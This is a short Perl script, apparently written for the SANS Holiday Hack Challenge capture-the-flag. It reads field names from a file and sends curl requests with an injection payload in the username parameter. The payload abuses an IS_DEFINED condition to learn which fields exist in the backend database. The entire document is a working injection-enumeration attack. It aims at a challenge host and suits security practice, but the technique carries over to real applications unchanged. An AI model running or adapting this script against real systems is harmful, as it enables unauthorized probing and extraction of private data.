#!/usr/bin/perl

@list = `cat list`;

foreach (@list) {
	chomp($_);
	print "testing $_\n";
	$command = "curl -s \"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=bruce%22%20AND%20IS_DEFINED(c\\[%22$_%22\\])%20--\&id=1d0a0f14-d70a-4ff7-b079-afedc4d04414\"";
	$run = `$command`;
	print "$run \n";
};
